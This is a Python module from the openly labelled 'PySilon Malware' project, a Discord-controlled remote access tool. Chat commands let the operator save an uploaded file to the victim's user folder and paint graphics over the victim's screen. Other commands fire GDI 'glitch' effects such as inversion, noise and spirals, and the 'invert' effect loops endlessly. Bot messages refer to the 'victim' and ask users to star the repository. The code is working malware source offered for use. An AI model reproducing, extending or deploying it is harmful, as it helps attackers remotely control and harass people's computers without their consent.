from PIL import Image, ImageDraw
from win32print import * 
from win32gui import *
from win32con import *
from win32api import *
import random
import math
import json
import time
import os
# end of imports

# on message
elif message.content == '.display-graphic':
    await message.delete()
    embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
    embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
    await message.channel.send(embed=embed)
    expectation = 'graphic_file'
    
elif message.content[:15] == '.display-glitch':
    await message.delete()
    if message.content.strip() == '.display-glitch':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".show" 
    elif message.content[16:] == 'list':
        embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    elif message.content[16:] + '\n' in flash_screen('list'):
        flash_screen(message.content[16:])
        embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        embed = discord.Embed(title="📛 Error",description='```Invalid argument!```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')

elif expectation == 'graphic_file':
    try:
        split_v1 = str(message.attachments).split("filename='")[1]
        filename = str(split_v1).split("' ")[0]
        filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
        await message.attachments[0].save(fp=filename)

        screen_manipulator(filename).display_graphic(10)

        embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
        embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
        await message.channel.send(embed=embed)

    except Exception as err: 
        await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
        expectation = None

# anywhere
class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = self.settings['resolution'][0], self.settings['resolution'][1]

    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in (0, 2, 4):
            decimal = int(hex[i:i+2], 16)
            rgb.append(decimal)
        return tuple(rgb)

    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()

        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)

        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            elif frame['mode'] == 'bmp':
                color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))

        size = frame['size']
        screen_dc = GetDC(0)
        screen_x_resolution = GetDeviceCaps(screen_dc, DESKTOPHORZRES)
        screen_y_resolution = GetDeviceCaps(screen_dc, DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution*(int(frame['position'][0])/100)), int(screen_y_resolution*(int(frame['position'][1])/100)))

        drawing = pixels
        start_time = time.time()
        while time.time() - start_time < seconds:
            screen_dc = GetDC(0)
            for pixel in drawing:
                brush = CreateSolidBrush(RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                SelectObject(screen_dc, brush)
                PatBlt(screen_dc, starting_pos[0] + pixel[0] * size, starting_pos[1] + pixel[1] * size, size, size, PATCOPY)

            DeleteObject(brush)
            ReleaseDC(0, screen_dc)

def flash_screen(effect):
    hdc = GetDC(0)
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)

    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']

    elif effect == 'invert':
        while True:
            PatBlt(hdc, 0, 0, x, y, PATINVERT)
    
    elif effect == 'noise':
        for _ in range(x * y // 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = CreateSolidBrush(color)

            SelectObject(hdc, brush)
            PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
    
    elif effect == 'lines':
        for _ in range(0, y, 5):
            PatBlt(hdc, 0, _, x, 2, PATINVERT)

    elif effect == 'invert_squares':
        for _ in range(200):
            rand_x1 = random.randint(0, x)
            rand_y1 = random.randint(0, y)
            rand_x2 = random.randint(0, x)
            rand_y2 = random.randint(0, y)
            PatBlt(hdc, rand_x1, rand_y1, rand_x2 - rand_x1, rand_y2 - rand_y1, PATINVERT)

    elif effect == 'color_squares':
        for i in range(10):
            for x in range(0, x, 20):
                for y in range(0, y, 20):
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x, y, 10, 10, PATCOPY)
                    DeleteObject(brush)
                    brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                    SelectObject(hdc, brush)
                    PatBlt(hdc, x + 10, y + 10, 10, 10, PATCOPY)
                    DeleteObject(brush)

    elif effect == 'diagonal_lines':
        for x in range(0, x, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, x, 0, 1, y, PATCOPY)
            DeleteObject(brush)
        for y in range(0, y, 10):
            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, y, x, 1, PATCOPY)
            DeleteObject(brush)

    elif effect == 'snowfall':
        for i in range(10):
            stars = [(random.randint(0, x), random.randint(0, y), random.randint(1, 4)) for _ in range(100)]
            for star in stars:
                rand_x, rand_y, size = star
                color = RGB(255, 255, 255)
                brush = CreateSolidBrush(color)
                SelectObject(hdc, brush)
                PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
            time.sleep(0.5)

    elif effect == 'hypnotic_spirals':
        for angle in range(0, 180, 1):
            radius = 1000
            x1 = int(x / 2 + radius * math.cos(math.radians(angle)))
            y1 = int(y / 2 - radius * math.sin(math.radians(angle)))
            x2 = int(x / 2 + radius * math.cos(math.radians(angle + 180)))
            y2 = int(y / 2 - radius * math.sin(math.radians(angle + 180)))
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            pen = CreatePen(PS_SOLID, 1, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)

    elif effect == 'random_lines':
        for _ in range(50):
            x1 = random.randint(0, x)
            y1 = random.randint(0, y)
            x2 = random.randint(0, x)
            y2 = random.randint(0, y)
            color = RGB(random.randrange(255), random.randrange(255), random.randrange(255))
            pen = CreatePen(PS_SOLID, 2, color)
            SelectObject(hdc, pen)
            MoveToEx(hdc, x1, y1)
            LineTo(hdc, x2, y2)
            DeleteObject(pen)
    
    else:
        PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect != 'list':
        Sleep(10)
        DeleteDC(hdc)
